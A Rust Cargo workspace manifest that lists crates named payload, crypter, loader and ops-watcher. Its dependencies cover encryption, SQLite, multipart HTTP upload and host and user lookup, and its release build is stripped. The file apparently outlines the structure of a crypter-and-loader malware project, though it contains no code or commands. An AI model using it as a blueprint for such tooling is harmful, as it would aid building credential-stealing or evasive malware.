[workspace]
resolver = "2"
members = [
    "crates/common",
    "crates/payload",
    "crates/crypter-ir",
    "crates/crypter-vm",
    "crates/crypter-synth",
    "crates/svc-loader",
    "crates/svc-crypter",
    "crates/ops-watcher",
]

exclude = ["out"]

[workspace.package]
edition = "2021"
rust-version = "1.78"

[workspace.dependencies]
aes-gcm = "0.10"
argon2 = "0.5"
base64 = "0.22"
rand = "0.8"
sha2 = "0.10"
serde = { version = "1", features = ["derive"] }
serde_json = "1"
hex = "0.4"
reqwest = { version = "0.12", default-features = false, features = ["rustls-tls", "blocking", "json", "multipart"] }
regex = "1"
rusqlite = { version = "0.32", features = ["bundled"] }
dirs = "5"
hostname = "0.4"
whoami = "1.5"

[profile.release]
opt-level = "z"
lto = "fat"
codegen-units = 1
panic = "abort"
strip = "symbols"
